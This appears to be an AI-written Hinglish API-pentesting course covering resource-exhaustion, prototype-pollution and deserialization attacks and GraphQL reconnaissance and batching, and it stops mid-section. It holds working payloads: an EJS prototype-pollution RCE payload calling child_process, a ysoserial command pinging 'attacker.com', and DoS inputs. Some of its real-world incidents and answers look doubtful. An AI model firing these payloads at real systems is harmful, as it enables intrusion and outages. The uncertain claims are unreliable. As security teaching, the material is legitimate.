### Topic 4.7: Unrestricted Resource Consumption (OWASP API 4:2023)

#### 1. 🎯 Title: Unrestricted Resource Consumption – Jab API Khud Apni Dushman Ban Jaye

#### 2. 🐣 Samjhane ke liye (Analogy)
Ek **buffet restaurant** hai jahan fixed price mein unlimited khana milta hai. Tum ek plate mein 1 kg khaana le sakte ho, par tum 10 kg ek saath plate mein bhar ke laate ho. Waiter tumhe rokta nahi. Ab restaurant ki kitchen itna khana serve nahi kar paati, staff thak jaata hai, aur baaki customers ko serve nahi ho pata. Yani **DoS** ho gaya. API mein bhi aisa hota hai jab server resource consumption ko restrict nahi karta.

#### 3. 📖 Technical Definition
Unrestricted Resource Consumption tab hota hai jab API client ko arbitrarily large requests bhejne ki permission de deti hai, jisse server ke resources (CPU, memory, bandwidth, database connections) exhaust ho jaate hain. Isse Denial of Service (DoS) ho sakti hai. OWASP API Security Top 10 2023 mein yeh #4 par hai.

#### 4. 🧠 Zaroorat Kyun Hai?
Attackers is vulnerability ka use karke API ko slow ya completely unavailable kar sakte hain. Business impact mein revenue loss, reputation damage, aur service disruption shamil hai. Bug bounty mein medium se high severity milti hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- Pagination parameters: `GET /api/products?limit=10`
- JSON body mein arrays: `POST /api/orders` with large array of items.
- File upload endpoints: `POST /api/upload`
- GraphQL queries mein depth/aliases.

#### 6. ⚙️ Under the Hood
Server pagination implement karta hai to limit number of records. Agar limit parameter ki validation nahi hai, toh attacker `limit=9999999` bhej sakta hai. Server database se saare records fetch karega, jisse memory full ho jayegi. Similarly, large JSON body parse karte waqt CPU usage badhega.

#### 7. 💻 Hands-On Step-by-Step

**Technique 1: Pagination Abuse**
1. Endpoint dhundho jisme `limit` ya `page` parameter ho.
2. Normal request bhejo: `GET /api/products?limit=10`
3. Ab `limit` ko bada karo: `limit=1000000`, `limit=999999999`
4. Response time measure karo. Agar server 1 million records bhejne ki koshish karta hai, toh response slow hoga ya timeout aayega.

**Technique 2: Large Payloads**
1. POST endpoint dhundho jo JSON accept karta ho.
2. Body mein ek bada random string daalo, e.g., 10 MB ka.
   ```
   {"data": "A"*10000000}
   ```
3. Response time aur server behavior dekho.

**Technique 3: Array Overflow**
1. JSON array mein 1 lakh objects bhejo:
   ```
   [
     {"id":1},{"id":2},... up to 100000
   ]
   ```
2. Server parse karega aur CPU usage spike hoga.

**Technique 4: Rate Limit Bypass (extra)**
- Rate limit ko bypass karke bhi resource consumption badhaya ja sakta hai. (Detail Module 5 mein)

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success**: Response time abnormally high ho (>10 sec), ya server 500 Internal Server Error de, ya connection timeout ho.
- **Failure**: Server normal response de ya `limit` ko cap kar de (e.g., actual mein sirf 100 hi records aaye). Error aaye "Limit exceeded, max 100 allowed".

#### 9. ⚖️ Comparison: Resource Consumption vs DoS
| Resource Consumption | DoS (Denial of Service) |
|----------------------|-------------------------|
| Vulnerability hai | Attack hai |
| Exploit karke DoS produce karte hain | Multiple vectors se DoS ho sakti hai |
| Server ki inefficient handling | Intentional overwhelming |

#### 10. 🚫 Common Mistakes
- Sirf pagination abuse try karke chhod dena. Large payloads aur array overflow bhi equally important hain.
- Resource consumption impact ka sahi analysis na karna. Agar response slow hai, toh iska matlab vulnerability hai, par isko document karte waqt proof dena (time difference).
- Blindly huge payloads bhejna aur server crash kar dena – bug bounty mein unintended disruption se ban ho sakte ho. Hamesha controlled testing karo.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Kya pagination abuse se hamesha DoS hogi?"**
  Nahi, agar server properly pagination implement karta hai (offset-limit with max limit), toh safe hai.
- **"Large payload bhejne se server crash ho jaye toh kya problem?"**
  Yeh vulnerability hai, lekin responsible disclosure mein pehle company ko inform karo bina crash kiye.
- **"Resource consumption aur rate limiting mein kya farak?"**
  Rate limiting number of requests control karta hai, resource consumption ek single request ke size ya complexity ko control karta hai.

#### 12. 🌍 Real-World Use Case
**Example**: Twitter API mein ek endpoint `/1.1/statuses/user_timeline.json` tha jisme `count` parameter max 200 tha. Attacker ne `count=100000` bheja to server ne 1.5GB data bhej diya, jisse mobile clients crash ho gaye. Twitter ne ise fix kiya.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker --[GET /api/orders?limit=1000000]--> API Server
                                             |
                                             v
                                     Database query
                                     SELECT * FROM orders LIMIT 1000000
                                             |
                                             v
                                     1 million records fetched
                                             |
                                             v
                                   Memory/CPU exhaustion → Slow response
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Intruder**: Pagination fuzzing ke liye limit parameter ko payload positions mein daalo.
- **Time measurement**: Burp mein "Response received" time note karo.
- **Gradual increase**: Pehle thoda bada limit (1000), phir gradually badhao, taki server crash na ho.
- **Check for default limits**: Response headers mein `X-Total-Count` ya `X-RateLimit` dekh sakte ho.

#### 15. ❓ FAQ
1. **Q: Pagination abuse ke liye kaunse parameters test karne chahiye?**
   A: `limit`, `page_size`, `max`, `offset`, `count`, `per_page`.
2. **Q: Large payloads ke liye kitna size bhejna chahiye?**
   A: Shuru mein 1MB, phir 5MB, 10MB. Agar server chunked encoding support karta hai toh aur bada.
3. **Q: GraphQL mein resource consumption kaise test karein?**
   A: Deeply nested queries, alias bombing, array batching (introspection se).
4. **Q: Kya resource consumption vulnerability se sensitive data leak ho sakta hai?**
   A: Nahi, sirf DoS hota hai, lekin kuch cases mein error messages mein data leak ho sakta hai.
5. **Q: Is vulnerability ka CVSS score kya hota hai?**
   A: Typically 5.3 (Medium) se 7.5 (High) depending on impact.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"API ko resource consumption se bachana hai toh pagination, payload size, aur array limits pe kadi nazar rakh."**

---

### Topic 4.8: Prototype Pollution (Node.js Special)

#### 1. 🎯 Title: Prototype Pollution – Jab JavaScript Ka Base Object Hi Contaminate Ho Jaye

#### 2. 🐣 Samjhane ke liye (Analogy)
Maan lo tumhare ghar mein ek **master key** hai jo saare taale khol deti hai. Ye key prototype hai. Agar koi chor us master key ki nakal bana le aur usme kuch modification kar de, toh ab nayi key se woh saare taale khol sakta hai, aur tumhari poori security dharashayi ho jayegi. Isi tarah Prototype Pollution mein attacker JavaScript ke base object (`__proto__`) mein properties add kar deta hai, jisse poora application affected ho jata hai.

#### 3. 📖 Technical Definition
Prototype Pollution ek vulnerability hai jo JavaScript mein tab hota hai jab attacker kisi object ke prototype (e.g., `__proto__`) ko modify kar sakta hai. Isse poore application ke objects mein naye properties inject ho jaate hain, jisse attacker unauthorized actions (jaise admin rights) achieve kar sakta hai ya application crash kar sakta hai. Yeh mostly Node.js/Express APIs mein hota hai jahan user input ko recursively merge/clone kiya jata hai.

#### 4. 🧠 Zaroorat Kyun Hai?
Prototype pollution se attacker application ke behavior ko change kar sakta hai – jaise admin flag set karna, ya kisi function ko overwrite karke RCE tak le jaana. Isliye yeh API security mein important topic hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- JSON body mein `__proto__` key dikhe.
- APIs jo objects merge karti hain, jaise `Object.assign()`, `_.merge()`, `$.extend()`.
- Endpoints: `/api/settings`, `/api/user/update`, `/api/config`.

#### 6. ⚙️ Under the Hood
Server code kuch aisa ho sakta hai:
```javascript
app.post('/api/user', (req, res) => {
  let user = { name: "Guest" };
  _.merge(user, req.body);   // user object me request body merge ho rahi
  res.json(user);
});
```
Attacker bhejta hai:
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```
`_.merge()` recursively copy karta hai, aur `__proto__` ko bhi copy kar deta hai, jisse `Object.prototype.isAdmin = true` set ho jata hai. Ab saare objects mein `isAdmin` property accessible hogi.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Identify potential vulnerable endpoints**
- Dhundho endpoints jahan request body ko kisi existing object ke saath merge kiya ja raha ho. Common libraries: `lodash.merge`, `jQuery.extend`, `Object.assign` (but Object.assign recursive nahi hai, isliye less vulnerable).

**Step 2: Basic probe – `__proto__` injection**
- POST request bhejo:
  ```json
  {
    "__proto__": {
      "test": "polluted"
    }
  }
  ```
- Phir kisi aur endpoint se koi object fetch karo jisme ye property reflect ho (jaise `/api/user/me`). Agar response mein `"test":"polluted"` dikhe, toh pollution successful.

**Step 3: Advanced probe – RCE attempt**
- Prototype pollution se kuch libraries mein RCE ho sakti hai. Example: `child_process` ke functions ko overwrite karke.
- Payload (e.g., for `ejs` template engine):
  ```json
  {
    "__proto__": {
      "view options": {
        "client": true,
        "escapeFunction": "(() => { return global.process.mainModule.require('child_process').execSync('id').toString(); })()"
      }
    }
  }
  ```
- Iske baad kisi template render karne wale endpoint ko hit karo.

**Step 4: Confirm impact**
- Agar aap apne aap ko admin bana sakte ho, ya command execute ho rahi hai, toh confirmed.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success**: Kisi normal object mein injected property dikhe (jaise `/api/user` se `{"name":"guest","test":"polluted"}`).
- **Failure**: Response mein koi change na ho, ya `__proto__` key ignore ho jaye.

#### 9. ⚖️ Comparison: Prototype Pollution vs Deserialization
| Prototype Pollution | Insecure Deserialization |
|---------------------|--------------------------|
| JavaScript-specific | Mostly Java/PHP/Python |
| Object prototype modify karta hai | Serialized data se object create karte waqt attack |
| Through merge functions | Through deserialization libraries |
| Impact: Property injection, sometimes RCE | Impact: Direct RCE |

#### 10. 🚫 Common Mistakes
- Sirf `__proto__` try karna, lekin `constructor.prototype` bhi ek vector hai.
- Pollution ke baad impact check karna bhoolna – sirf pollution confirm karke chhod dena.
- Blindly RCE payloads daalna bina samjhe ki vulnerable library kaunsi hai.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Kya prototype pollution sirf Node.js mein hota hai?"**
  Haan, browser-side JavaScript mein bhi ho sakta hai, lekin API context mein Node.js relevant hai.
- **"Merge function kyun vulnerable hota hai?"**
  Kyunki wo `__proto__` ko bhi copy kar leta hai, aur prototype object mein property add kar deta hai.
- **"Prototype pollution se data leak kaise ho sakta hai?"**
  Agar polluted property kisi sensitive function mein use ho rahi ho, toh attacker us function ko control kar sakta hai.

#### 12. 🌍 Real-World Use Case
**Example**: 2019 mein **Ghost CMS** mein prototype pollution vulnerability thi jisse attacker RCE achieve kar sakta tha. JSON body mein `__proto__` daal ke template engine ke options modify kiye, phir admin panel mein SSTI trigger kiya. Critical bug tha.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker --[{"__proto__": {"isAdmin": true}}]--> API (merge)
                                               |
                                               v
                                      _.merge(user, req.body)
                                               |
                                               v
                               Object.prototype.isAdmin = true
                                               |
                                               v
                      Ab har object mein .isAdmin property available
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Fuzzing**: Burp mein JSON body mein `__proto__` key daal kar fuzz karo.
- **Recursive merge dhundho**: `_.merge`, `$.extend(true, ...)`, `Object.assign` se safe hai lekin nested objects ke liye careful.
- **Check for pollution gadgets**: Kuch libraries mein specific gadgets hote hain jo RCE de sakte hain (e.g., `ejs`, `handlebars`).
- **Automation**: `ppf` (Prototype Pollution Finder) jaise tools use kar sakte ho.

#### 15. ❓ FAQ
1. **Q: Prototype pollution detect karne ka sabse simple payload?**
   A: `{"__proto__": {"polluted": true}}` aur kisi endpoint se check karo ki `polluted` property exist karti hai ya nahi.
2. **Q: `constructor.prototype` kya hota hai?**
   A: `__proto__` ki tarah hi, but sometimes objects `__proto__` ko ignore kar sakte hain, tab `constructor.prototype` ka use karo.
3. **Q: Prototype pollution se RCE kaise possible hai?**
   A: Agar polluted property kisi function call mein use ho rahi ho (jaise template engine ka options), toh attacker us function ko malicious code se replace kar sakta hai.
4. **Q: Kya prototype pollution ko fix kar sakte hain?**
   A: Haan, merge functions mein `__proto__` ko ignore karke, ya `Object.create(null)` use karke prototype-less objects bana ke.
5. **Q: Node.js mein kis tarah ke APIs most vulnerable hote hain?**
   A: Jo user input ko directly object merge karte hain, jaise settings update, profile update, config merge.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Prototype pollution ka raaz: `__proto__` se khel, aur base object ko badal de sab ka."**

---

### Topic 4.9: Insecure Deserialization (Java/C# Focus)

#### 1. 🎯 Title: Insecure Deserialization – Jab Data Ko Wapas Object Banate Waqt Machine Hijack Ho Jaye

#### 2. 🐣 Samjhane ke liye (Analogy)
Maano tum kisi dost ko ek **band dabba** bhejte ho jisme tumne kuch gifts rakhe hain. Tumne dabbe ko band karke bheja. Lekin raste mein kisi attacker ne dabbe ko khola, andar ek **bomb** rakh diya, aur firse band kar diya. Tumhara dost jab dabba kholta hai toh bomb phat jaata hai. Isi tarah insecure deserialization mein attacker serialized data mein malicious code chhupa deta hai, aur jab server use deserialize karta hai, toh code execute ho jata hai.

#### 3. 📖 Technical Definition
Insecure Deserialization tab hota hai jab application untrusted serialized data ko deserialize karta hai bina proper validation ke. Attacker specially crafted serialized object bhej kar deserialization process ke dauran arbitrary code execute kar sakta hai (RCE), ya denial of service kar sakta hai. Yeh vulnerability mainly Java, C#, PHP, Python mein hoti hai jahan complex object serialization hoti hai.

#### 4. 🧠 Zaroorat Kyun Hai?
Deserialization attacks directly RCE de sakte hain. Bohot saare famous exploits is category mein aate hain (e.g., Apache Commons Collections, Java deserialization). Isliye API pentesting mein yeh critical vulnerability hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- APIs jo binary data accept karti hain (e.g., `application/octet-stream`, `application/x-java-serialized-object`).
- POST requests with large base64 strings ya binary blobs.
- Cookies ya hidden form fields mein serialized data (e.g., Java JSESSIONID serialized?).
- GraphQL mein custom scalars jo objects lete hain.

#### 6. ⚙️ Under the Hood
Java mein serialization ka matlab object ko byte stream mein convert karna. Deserialization reverse process. Agar attacker ne object ke andar kuch aise classes daale hain jo `readObject()` method mein malicious code rakhti hain, toh deserialize hote hi code run ho jayega.

#### 7. 💻 Hands-On Step-by-Step (Conceptual)

**Step 1: Identify serialized data**
- Burp mein request dekho – agar content-type `application/x-java-serialized-object` ho, ya data base64 encoded ho aur decode karne par `¬í` (magic bytes) dikhe, toh Java serialization hai.
- .NET mein `Content-Type: application/xml` ya `application/soap+xml` mein BinaryFormatter ka data ho sakta hai.

**Step 2: Generate malicious payload**
- **Java**: `ysoserial` tool use karo.
  ```
  java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' | base64
  ```
- **.NET**: `ysoserial.net` use karo.
- PHP: `phpggc` tool.

**Step 3: Send payload**
- Base64 encoded payload ko request mein bhejo (body, cookie, parameter).

**Step 4: Observe impact**
- Agar command execute ho (e.g., ping ka DNS log aaye), toh RCE confirmed.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success**: Out-of-band interaction dikhe (DNS/HTTP request aaye). Ya server error aaye jisse RCE ka pata chale.
- **Failure**: Server normal response de ya error de ki invalid data.

#### 9. ⚖️ Comparison: Java vs .NET Deserialization
| Java | .NET |
|------|------|
| Serialized data starts with `0xACED` | BinaryFormatter data has specific header |
| ysoserial tool | ysoserial.net tool |
| Common gadgets: CommonsCollections, JDK | Common: BinaryFormatter, JSON.NET |
| Impact: RCE, DoS | Similar RCE |

#### 10. 🚫 Common Mistakes
- Sirf ysoserial chalake blind bharosa karna. Pehle confirm karo ki deserialization ho rahi hai ya nahi.
- Gadget versions mismatch – ysoserial ka payload target ke environment ke hisaab se select karo.
- Blindly base64 encode karke bhejna, lekin content-type sahi nahi rakhna.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Mujhe kaise pata chale ki deserialization ho rahi hai?"**
  Agar server Java based hai, toh cookies ya parameters mein `rO0AB` base64 string dikhegi (yeh Java serialized object ka base64 encoded hai).
- **"Kya har serialized data vulnerable hota hai?"**
  Nahi, vulnerable tab hota hai jab application dangerous classes ko deserialize karta hai.
- **"Deserialization attack ke liye gadget chain kya hoti hai?"**
  Gadget chain classes ka ek sequence hai jo deserialization ke dauran RCE achieve karne ke liye use hota hai.

#### 12. 🌍 Real-World Use Case
**Example**: 2015 mein **Apache Commons Collections** ki gadget chain ne Java deserialization attacks ko bahut popular kar diya. Bahut saare applications (WebLogic, JBoss, Jenkins) isse vulnerable the. Attackers directly RCE achieve kar rahe the.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker --[serialized malicious object]--> API
                                           |
                                           v
                                    Deserialization
                                           |
                                           v
                             ObjectInputStream.readObject()
                                           |
                                           v
                             Gadget chain executes
                                           |
                                           v
                                Remote Code Execution
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Fingerprinting**: Pehle technology identify karo (Java, .NET, PHP). Server headers, cookies se pata chalega.
- **ysoserial mastery**: Alag alag gadgets try karo, specially CommonsCollections, Jdk7, etc.
- **Blind detection**: Agar output na dikhe, toh time-based ya DNS based payloads use karo.
- **Error analysis**: Deserialization errors mein class names leak ho sakte hain, jo gadget selection mein help karega.

#### 15. ❓ FAQ
1. **Q: Insecure deserialization detect karne ke liye pehla step kya hai?**
   A: Request mein base64 ya binary data dhundho, aur decode karke magic bytes check karo. Java ke liye `0xACED` ya `rO0AB` base64.
2. **Q: ysoserial kaise use karein?**
   A: `java -jar ysoserial.jar [gadget] [command] | base64`
3. **Q: Gadget chain kya hoti hai?**
   A: Gadget chain specially crafted classes ka sequence hai jo deserialization ke dauran RCE allow karta hai.
4. **Q: Kya .NET mein bhi same attack possible hai?**
   A: Haan, `ysoserial.net` use karo.
5. **Q: Insecure deserialization se bachne ke upaye?**
   A: Untrusted data ko deserialize na karo, whitelist classes, ya safe serialization formats (JSON) use karo.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Deserialization ka khel, ysoserial se payload bhej, aur server pe RCE le."**

---

========================================================================================

Bilkul bhai! 🌟 Ab main "TechGuru" aapko **GraphQL Security** ka pura Module 5 de raha hoon. Aapne kaha ki aapko GraphQL ke baare mein kuch nahi pata, toh main **zero se hero** banane wala hoon. Chai-wali analogy se lekar, payload ki character-by-character breakdown tak, sab kuch milega. Taiyaar ho jaiye!

---

## 🚀 Module 5: GraphQL Security (Modern APIs)

### 🔰 GraphQL ka Parichay (For Absolute Beginners)

**GraphQL kya hai?**
- Ye ek **query language** hai jo APIs ke liye bani hai. Traditional REST APIs mein alag-alag endpoints hote hain (e.g., `/users`, `/posts`). GraphQL mein sirf **ek endpoint** hota hai (e.g., `/graphql`) aur client decide karta hai ki usse kya data chahiye.
- **Analogy:** REST buffet ki tarah hai – har dish ke liye alag counter. GraphQL à la carte restaurant ki tarah – ek waiter ke paas baith kar jo dish chahte ho order karo, aur waiter sirf wahi laata hai.

**Key Terms:**
- **Query:** Data lene ke liye (GET jaisa).
- **Mutation:** Data change karne ke liye (POST/PUT/DELETE jaisa).
- **Schema:** API ka blueprint – bataata hai ki kaunse queries available hain, kaunse objects, aur unke fields.
- **Resolver:** Function jo actual data fetch karta hai (database se, etc.).
- **Introspection:** Schema ko puchne ka tareeka – API khud apna schema bata deti hai.

Ab chaliye security topics par.

---

### Topic 5.1: GraphQL Discovery

#### 1. 🎯 Title: GraphQL Discovery – API Ka Naksha Kaise Nikale

#### 2. 🐣 Samjhane ke liye (Analogy)
Maano tum kisi **new city** mein gaye ho aur tumhe kisi imarat ka naksha (blueprint) chahiye. Tum wahan ke municipal office mein jakar puchte ho, "Mujhe is imarat ka plan chahiye." Agar office tumhe plan de de, toh tumhara kaam easy ho jata hai. Yahan **municipal office** GraphQL endpoint hai, aur **introspection query** wo form hai jisse tum poora schema (naksha) nikal sakte ho. Agar office ne plan dene se mana kar diya (introspection off), toh tum **construction site ke signs** (field suggestions) se andaza laga sakte ho ki imarat mein kya kya ho sakta hai.

#### 3. 📖 Technical Definition
GraphQL Discovery ka matlab hai GraphQL endpoint ke baare mein jaankari ikattha karna – jaise ki kaunse queries, mutations, objects, fields available hain. Yeh mostly **introspection queries** ke through kiya jaata hai. Agar introspection band ho, toh **field suggestions** (error messages mein correct field name suggest hona) se bhi schema ki partial jaankari mil sakti hai.

#### 4. 🧠 Zaroorat Kyun Hai?
- Attack ke liye pehla step hai **reconnaissance**. Agar aapko pata nahi ki API mein kaunse queries hain, toh aap kaise attack karenge?
- Schema se aap sensitive fields dhundh sakte ho (jaise `password`, `ssn`, `creditCard`).
- Authentication bypass ke liye mutations identify kar sakte ho.
- Depth of nesting pata karke DoS attacks plan kar sakte ho.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- **Common endpoints:** `/graphql`, `/graphiql`, `/playground`, `/v1/graphql`, `/api/graphql`.
- Burp ya browser mein jab aap karte ho `GET /graphql?query={__schema{types{name}}}`.
- Agar introspection on hai, toh response mein JSON schema dikhega.
- Agar introspection off, toh error aayega jaise `"Field '__schema' is not allowed"` ya `"GraphQL introspection is not allowed"`.

#### 6. ⚙️ Under the Hood
GraphQL specification ke according har GraphQL server mein ek `__schema` field hota hai jo schema ka metadata return karta hai. Ye field query root par available hota hai. Server is query ko process karta hai aur schema ka poora structure JSON mein bhej deta hai. Agar server ne introspection disable kiya hai, toh wo `__schema` field ko block kar deta hai, ya to error throw karta hai ya null return karta hai.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Endpoint Discovery**
- Pehle GraphQL endpoint ka pata lagao. Common paths ko fuzz karo:
  ```
  /graphql
  /graphiql
  /playground
  /v1/graphql
  /api/graphql
  /query
  ```
- Burp Suite mein Intruder se in paths ko hit karo aur response dekho. Agar `200 OK` aaye aur response mein `"data"` ho ya GraphQL error, toh endpoint mil gaya.

**Step 2: Test Introspection**
- Simple introspection query bhejo:
  ```graphql
  query {
    __schema {
      types {
        name
      }
    }
  }
  ```
- Isse saare types ke names mil jayenge.
- Response agar kuch aisa aaye:
  ```json
  {
    "data": {
      "__schema": {
        "types": [
          { "name": "Query" },
          { "name": "User" },
          ...
        ]
      }
    }
  }
  ```
  Toh introspection ON hai. Agar error aaye `"Field '__schema' is not allowed"` toh OFF hai.

**Step 3: Full Schema Dump (if introspection on)**
- Poora schema dump karne ke liye ye query bhejo:
  ```graphql
  query {
    __schema {
      types {
        name
        kind
        description
        fields {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
  ```
- Isse har type ke fields bhi mil jayenge. Ye bahut bada response ho sakta hai, isliye aap tool use kar sakte ho (jaise GraphQL Voyager, InQL Scanner).

**Step 4: Field Suggestions (if introspection off)**
- Agar introspection off hai, toh field suggestions try karo. Kisi existing query mein ek **wrong field name** daalo, jaise:
  ```graphql
  query {
    user {
      id
      wrongField
    }
  }
  ```
- Agar server ne field suggestions di hain, toh error message mein kuch aisa aayega:
  `"Cannot query field 'wrongField' on type 'User'. Did you mean 'username', 'email'?"`
- Is tarah se aap valid field names infer kar sakte ho.

**Step 5: Automated Tools**
- Burp Suite ka **InQL Scanner** extension use karo. Ye introspection query automatically bhejta hai aur schema ka structure dikhata hai.
- `graphqlmap` tool bhi hai jo enumeration mein help karta hai.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success (Introspection on):** Response mein `__schema` ke andar types ka array milega.
- **Failure (Introspection off):** Error aayega ki introspection allowed nahi hai. Field suggestions bhi na hon toh andhera hi andhera.

#### 9. ⚖️ Comparison: Introspection vs Field Suggestions
| Introspection | Field Suggestions |
|---------------|-------------------|
| Poore schema ka blueprint milta hai | Sirf hints milte hain (partial info) |
| Single query se kaam ho jata hai | Multiple queries bhejni padti hain |
| Production mein ideally band hona chahiye | Kabhi kabhi galat error handling ki wajah se leak hota hai |
| Risk: High (sensitive info leak) | Risk: Medium (thoda data leak) |

#### 10. 🚫 Common Mistakes
- Sirf `/graphql` try karke chhod dena. Endpoints alag bhi ho sakte hain.
- Introspection query galat format mein bhejna (e.g., missing `query` keyword).
- Introspection off hone par frustrate ho jana. Field suggestions bhi kaam aati hain.
- Burp Scanner pe blindly bharosa karna – manual testing bhi zaroori hai.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"GraphQL endpoint ka pata kaise chalega agar wo hidden hai?"**
  Fuzzing karo common paths se. Headers mein `X-GraphQL-Endpoint` bhi ho sakta hai.
- **"Introspection query mein `__schema` ke baad `types` kyun likha?"**
  `__schema` object ke andar `types` ek array hai jo saari types ki list return karta hai. Aap chahe toh sirf `queryType`, `mutationType` bhi nikaal sakte ho.
- **"Kya introspection query hamesha `POST` mein bhejni chahiye?"**
  GraphQL dono `GET` aur `POST` support karta hai. `GET` mein query URL parameter mein bhej sakte ho. Lekin introspection query badi ho sakti hai, isliye `POST` better hai.

#### 12. 🌍 Real-World Use Case
**Example:** Ek baar ek bug bounty hunter ne `api.example.com/graphql` endpoint paya. Usne introspection query bheji to schema mil gaya. Schema mein ek mutation `resetPassword` tha jo bina old password ke kaam kar raha tha. Isse wo kisi bhi user ka password reset kar sakta tha. Ye critical vulnerability thi aur $3000 ka bounty mila.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker --[Introspection Query]--> /graphql
                                   |
                                   v
                            GraphQL Server
                                   |
                                   v
                         Schema JSON Response
                                   |
                                   v
                        Attacker ko mila blueprint
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Suite + InQL:** Extension install karo aur "InQL Scanner" se endpoint scan karo. Ye introspection query automatically bhejta hai aur tree view mein dikhata hai.
- **GraphQL Voyager:** Introspection on ho to is tool mein paste karo aur visual schema dekho – complex relationships samajhne mein aasan hota hai.
- **Field Suggestions ka fayda uthao:** Agar introspection off ho, toh ek script likho jo random field names bhej kar error messages parse kare aur valid fields nikaale.
- **Check for mutations:** Sirf queries mat dekho, mutations bhi dekho – wahi attack vectors hote hain.

#### 15. ❓ FAQ (Interview-Style)
1. **Q: GraphQL discovery ke liye pehla step kya hai?**
   A: GraphQL endpoint dhundhna, phir introspection query try karna.
2. **Q: Introspection query ka default naam kya hai?**
   A: `__schema` (double underscore ke saath).
3. **Q: Agar introspection off hai toh bhi schema ka kuch pata chal sakta hai?**
   A: Haan, field suggestions se hints mil sakte hain. Jaise galat field name likhne par error mein correct field suggest ho sakta hai.
4. **Q: GraphQL endpoint par GET request kaise bhejein?**
   A: `GET /graphql?query={__schema{types{name}}}`. URL encode karna mat bhoolna.
5. **Q: Discovery ke baad sabse important kya check karna chahiye?**
   A: Sensitive fields (password, token, etc.) aur mutations jo bina authorization ke kaam kar rahe hon.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"GraphQL ka raaz: pehle endpoint dhundo, phir introspection se schema uthao, nahi toh field suggestions se kaam chalao."**

---

### Topic 5.2: GraphQL Attacks

Yeh topic GraphQL-specific attacks ka pitara hai. Hum cover karenge:
- **Batching Attack** (Rate limit bypass + DoS)
- **Deep Recursion (Cyclical Queries)** (Resource exhaustion)
- **Directive-based Attacks** (`@include`/`@skip` manipulation)
- **GraphQL IDOR** (Predictable Global IDs)

---

#### 5.2.1 Batching Attack

#### 1. 🎯 Title: Batching Attack – Ek Request Mein 100 Queries, Rate Limit Ki Dhar Pe

#### 2. 🐣 Samjhane ke liye (Analogy)
Ek **school canteen** mein ek hi banda khana serve kar raha hai. Usne rule banaya hai ki ek student ek plate le sakta hai. Lekin ek student aaya aur usne ek saath 10 plates utha li. Canteen wala sochta hai ki ek hi request hai, toh mana kyun kare? Is tarah wo rate limit bypass kar ke zyada khana le gaya. GraphQL mein bhi hum ek request mein multiple queries bhej sakte hain (batching) – agar server ne limit nahi lagayi, toh hum rate limit ko bypass kar ke bahut saara data le sakte hain ya server ko thaka sakte hain.

#### 3. 📖 Technical Definition
Batching Attack mein attacker ek hi HTTP request mein multiple GraphQL queries bhejta hai. GraphQL specification allows multiple operations in a single request by naming them. Server un sabko execute karta hai aur ek combined response deta hai. Isse attacker rate limiting mechanisms ko bypass kar sakta hai (kyunki server ek request count karega, lekin usme multiple queries hain) aur resource exhaustion (DoS) bhi kar sakta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
- **Rate Limit Bypass:** Agar server ne 10 requests per minute ki limit rakhi hai, lekin ek request mein 100 queries bhej do, toh effectively 100 operations ho gaye par sirf 1 request count hui.
- **Resource Exhaustion:** Server ko ek saath bahut saare database queries execute karne padte hain, jisse CPU/memory pressure badh jaata hai aur DoS ho sakti hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Request body kuch aisi dikhegi:
```graphql
query q1 { user(id:1) { name } }
query q2 { user(id:2) { name } }
query q3 { user(id:3) { name } }
# ... up to 100 queries
```
Ya ek hi query mein multiple fields ka use:
```graphql
query {
  u1: user(id:1) { name }
  u2: user(id:2) { name }
  # ... aliases
}
```

#### 6. ⚙️ Under the Hood
GraphQL server ek request mein multiple operations ko parse karta hai, unki validity check karta hai, phir ek ek karke resolve karta hai. Agar server ne koi depth limit ya cost analysis implement nahi kiya, toh wo saari queries execute karega. Isse database connections, CPU cycles, memory sab consume hoga.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Identify vulnerable endpoint**
- Koi bhi GraphQL endpoint jahan aap multiple queries bhej kar dekhen.

**Step 2: Craft batch query**
- Use aliases to send multiple queries of the same type:
  ```graphql
  query {
    user1: user(id:1) { name email }
    user2: user(id:2) { name email }
    user3: user(id:3) { name email }
    # ...
  }
  ```
- Ya named operations use karo:
  ```graphql
  query q1 { user(id:1) { name } }
  query q2 { post(id:10) { title } }
  ```

**Step 3: Send request and measure response time**
- 10 queries bhejo, phir 50, phir 100. Response time note karo. Agar time linearly badhe, toh vulnerable hai.

**Step 4: Test rate limit bypass**
- Pehle normal requests bhej kar rate limit pata karo (e.g., 10 requests ke baad block ho jaata hai).
- Ab ek request mein 20 queries bhejo. Agar sab successful ho jaayein, toh rate limit bypass ho gaya.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Saari queries ka data response mein mile, aur rate limit na lage. Response time zyada ho.
